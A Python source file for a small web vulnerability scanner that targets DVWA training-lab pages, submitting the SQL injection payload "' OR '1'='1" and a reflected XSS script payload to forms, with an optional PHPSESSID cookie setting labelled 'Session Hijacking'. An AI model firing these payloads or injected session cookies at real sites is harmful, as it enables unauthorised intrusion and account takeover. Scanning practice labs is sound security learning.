import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

class AegisWebAuditor:
    def __init__(self, target_url):
        if not target_url.startswith("http"):
            self.target_url = "https://" + target_url
        else:
            self.target_url = target_url
        
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Aegis-Security-Scanner/4.5"

        # Session Hijacking Configuration (Optional)
        # Leave empty if unauthenticated scan is desired
        phpsessid_value = ""  
        
        if phpsessid_value:
            self.session.cookies.set("PHPSESSID", phpsessid_value)
            self.session.cookies.set("security", "low")
            print(f"[*] Session Hijacking Active. Cookie: {phpsessid_value[:5]}***")

    def get_all_forms(self, url):
        try:
            content = self.session.get(url).content
            soup = bs(content, "html.parser")
            return soup.find_all("form")
        except:
            return []

    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
            
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submit_form(self, form_details, url, value):
        target_url = urljoin(url, form_details["action"])
        inputs = form_details["inputs"]
        data = {}
        
        for input in inputs:
            if input["type"] in ["text", "search", "password", "number"]:
                input_name = input["name"]
                if input_name:
                    data[input_name] = value
            if input["type"] == "submit" and input.get("name"):
                 data[input["name"]] = input.get("value", "Submit")

        if form_details["method"] == "post":
            return self.session.post(target_url, data=data)
        else:
            return self.session.get(target_url, params=data)

    def scan_sql_injection(self):
        # Specific endpoint check for labs like DVWA
        vuln_url = f"{self.target_url}/vulnerabilities/sqli/"
        
        print(f"[*] Checking SQL Injection on {vuln_url}...")
        
        try:
            check = self.session.get(vuln_url)
            if "Login" in check.text and "Username" in check.text:
                print("[!] Login required for SQLi scan.")
                return []
        except:
            return []

        forms = self.get_all_forms(vuln_url)
        vulnerabilities = []
        
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "MariaDB server",
        ]
        
        payload = "' OR '1'='1" 

        for form in forms:
            form_details = self.get_form_details(form)
            res = self.submit_form(form_details, vuln_url, payload)
            
            if res:
                content_lower = res.content.decode().lower()
                if "admin" in content_lower and "surname" in content_lower:
                    vulnerabilities.append({
                        "type": "SQL Injection (Auth Bypass)",
                        "location": f"{vuln_url}",
                        "payload": payload
                    })
                    break 
                
                for error in sql_errors:
                    if error in content_lower:
                        vulnerabilities.append({
                            "type": "SQL Injection (Error Based)",
                            "location": vuln_url,
                            "payload": payload
                        })
                        break
        return vulnerabilities

    def scan_xss(self):
        vuln_url = f"{self.target_url}/vulnerabilities/xss_r/"
        print(f"[*] Checking XSS on {vuln_url}...")
        
        forms = self.get_all_forms(vuln_url)
        vulnerabilities = []
        
        xss_payload = "<script>alert('Aegis')</script>"

        for form in forms:
            form_details = self.get_form_details(form)
            res = self.submit_form(form_details, vuln_url, xss_payload)
            
            if res:
                if xss_payload in res.content.decode():
                    vulnerabilities.append({
                        "type": "Reflected XSS",
                        "location": f"{vuln_url}",
                        "payload": xss_payload
                    })
        return vulnerabilities